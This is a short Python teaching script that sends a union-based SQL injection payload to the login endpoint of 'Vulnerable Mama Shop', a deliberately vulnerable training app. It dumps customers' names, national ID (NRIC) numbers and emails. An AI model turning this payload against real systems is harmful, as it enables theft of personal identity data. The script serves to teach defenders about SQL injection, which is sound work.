#!/usr/bin/python3
#
# Simple Python Script to exploit SQL injection 
# on the Vulnerable Mama Shop and dump out customer details
# Vulnerable Mama Shop is a simple application running on
# LAMP stack in a docker container for learning about
# SQL Injection 
# 
# Usage: python3 sql-inject [host:port]
# 
# Disclaimer and Warning
# ---------------------
# Computer misuse is a serious crime in Singapore and other countries, punishable by law.
# The source code and instructions provided here are for educational purposes only; 
# meant to help IT defenders understand about SQL Injection vulnerabilities and better 
# defend their systems and applications. It should not be misused for any other purposes. 
#
#  Copyright (c) 2018 Ng Chiang Lin
# 
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# 
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
# 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#
# 

import sys
from socket import *

payload="catid=1000+union+select+firstname%2C+nric%2C+email+from+users+LIMIT+7%2C+100"



if __name__ == "__main__" :
   if len(sys.argv) != 2:
      print("Usage: python3 " , sys.argv[0] , "[host:port]")
      sys.exit(1)

   parts = sys.argv[1]
   parts = parts.split(":")
  
   if len(parts) != 2:
      print("Invalid host:port format")
      sys.exit(1)

   host = parts[0]
   port = parts[1]
   port = int(port)

   sdata =("POST /welcome.php HTTP/1.1\r\n" +
           "User-Agent: Python3 Socket\r\n" +
           "Content-Type: application/x-www-form-urlencoded\r\n" +
           "Content-Length: " + str(len(payload)) + "\r\n" +
           "Host: " + host + ":" + str(port) + "\r\n\r\n" +
           payload)


   sock = socket(AF_INET, SOCK_STREAM)
   sock.connect((host, port))

   sock.sendall(sdata.encode('utf-8'))
   content = sock.recv(8192)
   sock.close()

   print(content.decode('utf-8'))
    

   



